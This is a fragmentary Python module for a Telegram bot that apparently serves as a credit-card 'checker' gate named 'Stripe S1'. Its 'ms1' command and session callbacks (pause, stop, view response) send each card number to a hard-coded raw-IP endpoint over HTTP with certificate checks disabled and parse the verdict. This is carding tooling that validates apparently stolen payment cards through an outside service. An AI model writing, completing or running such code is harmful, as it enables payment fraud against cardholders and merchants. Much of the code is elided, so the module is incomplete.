...
GATE_NAME = "Stripe S1"
GATE_CMD = "ms1"
MS1_API = "http://5.83.136.66:8012/stripe?cc={cc}"
active_sessions = {}
...
def process_single_card(card):
    try:
        resp = requests.get(MS1_API.format(cc=card), timeout=90, verify=False)
        if resp.status_code == 200:
            data = resp.json()
...
@router.message(Command("ms1"))
async def ms1_command(message: types.Message):
...
@router.callback_query(F.data.startswith("ms1_card_"))
async def ms1_card_callback(callback: types.CallbackQuery):
...
@router.callback_query(F.data.startswith("ms1_response_"))
async def ms1_response_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
...
@router.callback_query(F.data.startswith("ms1_stop_"))
async def ms1_stop_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
...
@router.callback_query(F.data.startswith("ms1_pause_"))
async def ms1_pause_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
